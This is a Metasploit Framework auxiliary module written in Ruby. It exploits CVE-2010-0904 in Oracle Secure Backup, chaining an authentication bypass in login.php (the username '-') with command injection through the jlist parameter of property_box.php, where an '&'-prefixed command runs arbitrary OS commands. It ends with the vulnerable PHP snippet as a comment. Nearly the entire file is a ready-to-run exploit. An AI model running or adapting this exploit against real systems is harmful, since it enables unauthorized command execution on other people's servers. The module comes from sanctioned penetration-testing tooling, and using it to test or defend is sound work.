##
# $Id: osb_execqr3.rb 14774 2012-02-21 01:42:17Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability',
			'Description'    => %q{
					This module exploits an authentication bypass vulnerability
				in login.php in order to execute arbitrary code via a command injection
				vulnerability in property_box.php. This module was tested
				against Oracle Secure Backup version 10.3.0.1.0 (Win32).
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 14774 $',
			'References'     =>
				[
					[ 'CVE', '2010-0904' ],
					[ 'OSVDB', '66338'],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-118' ],
				],
			'DisclosureDate' => 'Jul 13 2010'))

		register_options(
			[
				Opt::RPORT(443),
				OptString.new('CMD', [ false, "The command to execute.", "cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\metasploit.txt" ]),
				OptBool.new('SSL',   [true, 'Use SSL', true]),
			], self.class)
	end

	def run
		cmd = datastore['CMD']

		res = send_request_cgi(
			{
				'uri'	=>  '/login.php',
				'data'	=>  'attempt=1&uname=-',
				'method' => 'POST',
			}, 5)

			if (res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/PHPSESSID=(.*);(.*)/i))

				sessionid = res.headers['Set-Cookie'].split(';')[0]

					print_status("Sending command: #{datastore['CMD']}...")

					send_request_cgi(
						{
							'uri'	=> '/property_box.php',
							'data'  => 'type=Job&jlist=' + Rex::Text.uri_encode('&' + cmd),
							'cookie' => sessionid,
							'method' => 'POST',
						}, 5)

				print_status("Done.")
			else
				print_error("Invalid PHPSESSION token..")
				return
			end
	end
end
=begin
  else if (strcmp($type, "Job") == 0)
    {
    if (!is_array($objectname))
      $objectname = array();
    reset($objectname);
    while (list(,$oname) = each($objectname))
      {
      $oname = escapeshellarg($oname);
      $jlist = "$jlist $oname";
      }
    if (strlen($jlist) > 0)
      $msg = exec_qr("$rbtool lsjob -lrRLC $jlist");
=end
